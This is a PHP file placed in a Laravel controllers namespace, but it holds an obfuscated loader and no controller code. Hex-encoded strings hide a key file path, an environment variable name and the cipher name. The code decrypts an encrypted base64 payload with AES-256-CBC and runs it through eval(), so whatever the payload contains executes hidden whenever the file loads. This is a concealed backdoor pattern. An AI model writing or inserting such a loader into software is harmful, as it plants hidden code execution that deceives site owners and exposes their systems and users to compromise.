<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ut7OzeLPcYCXOkNzoBgvqg==');

$c=base64_decode(

'48KcRhxuE/WZv8bAXDVEK8u4D8t9GMz9Jkl3azTCaqQ+b2zEy+GvNv/AGq20ppaeIFpzjLerfZgP' .
'grLhhBNSB1r2vaEEfQ1xEKkfs+FB0ngbYOXokuANSh3o7XbloQmduHZ4XhiHzNuUPipUOZXRCjES' .
'GrGcr+4S5Hm5Y/JzVw1ymGCuV1aK99t5I18NaH11bdn3ZM3eAHpuri2hWqWn3t/ei0kZSHcAoFAT' .
'Baolv+KzZJkLZtyDQkrQjIN0zTNbQ0cKJRaIyO9aTqRGFVJDfu6ZdbphQW0DUW3Npg37Lcw='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

